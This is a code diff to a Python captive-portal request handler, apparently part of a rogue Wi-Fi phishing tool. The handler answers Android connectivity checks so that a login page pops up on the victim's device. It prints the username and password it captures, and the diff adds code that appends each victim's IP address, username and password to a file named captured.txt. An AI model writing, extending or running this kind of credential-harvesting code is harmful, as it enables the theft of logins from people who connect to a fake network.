@@ -97,7 +97,7 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
         if 'Android' in user_agent:
             print(f"       User-Agent: {user_agent}")
         
-        # Handle Android captive portal detection - critical for popup
+        # Handle Android captive portal detection
         android_hosts = [
             "connectivitycheck.gstatic.com", 
             "connectivitycheck.android.com", 
@@ -195,6 +195,18 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
             # Only log if credentials are actually provided
             if username and password:
                 print(f"[+] Captured from {client_ip}: user={username} pass={password}")
+                
+                # Write credentials to file
+                import time
+                timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+                log_entry = f"[{timestamp}] IP: {client_ip} | User: {username} | Pass: {password}\n"
+                
+                try:
+                    with open('captured.txt', 'a') as f:
+                        f.write(log_entry)
+                    print(f"       Credentials saved to captured.txt")
+                except Exception as e:
+                    print(f"       Error saving credentials: {e}")
                 
                 # Mark client as authenticated
                 subprocess.run([
